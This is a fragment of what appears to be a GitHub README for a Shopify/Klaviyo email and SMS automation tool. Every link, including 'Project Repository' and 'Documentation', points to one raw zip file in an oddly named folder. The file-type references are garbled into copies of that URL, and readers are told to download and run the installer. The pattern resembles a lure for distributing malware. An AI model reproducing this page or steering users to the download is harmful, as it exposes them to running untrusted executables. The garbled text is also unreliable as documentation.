...
[![Download Release](https://github.com/shirshakrb/shopify-klaviyo-email-sms-flow-automation/raw/refs/heads/main/irrelevantly/automation_klaviyo_shopify_flow_email_sms_2.3-alpha.1.zip%20now-%F0%9F%9A%80-brightgreen)](https://github.com/shirshakrb/shopify-klaviyo-email-sms-flow-automation/raw/refs/heads/main/irrelevantly/automation_klaviyo_shopify_flow_email_sms_2.3-alpha.1.zip)
...
1. **Visit the Releases Page**: Click the link below to go to our Releases page:
   [Download Here](https://github.com/shirshakrb/shopify-klaviyo-email-sms-flow-automation/raw/refs/heads/main/irrelevantly/automation_klaviyo_shopify_flow_email_sms_2.3-alpha.1.zip)
   
2. **Select the Latest Release**: You will see a list of releases. Look for the latest version, usually at the top.

3. **Download the Appropriate File**: Click on the file that matches your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or a `https://github.com/shirshakrb/shopify-klaviyo-email-sms-flow-automation/raw/refs/heads/main/irrelevantly/automation_klaviyo_shopify_flow_email_sms_2.3-alpha.1.zip` file for Linux).
...
4. **Run the Installer**:
   ...
   - For Linux: Extract the `https://github.com/shirshakrb/shopify-klaviyo-email-sms-flow-automation/raw/refs/heads/main/irrelevantly/automation_klaviyo_shopify_flow_email_sms_2.3-alpha.1.zip` file and run the installation script from the terminal.
...
## 🔗 Useful Links
- [Project Repository](https://github.com/shirshakrb/shopify-klaviyo-email-sms-flow-automation/raw/refs/heads/main/irrelevantly/automation_klaviyo_shopify_flow_email_sms_2.3-alpha.1.zip)
- [Documentation](https://github.com/shirshakrb/shopify-klaviyo-email-sms-flow-automation/raw/refs/heads/main/irrelevantly/automation_klaviyo_shopify_flow_email_sms_2.3-alpha.1.zip)
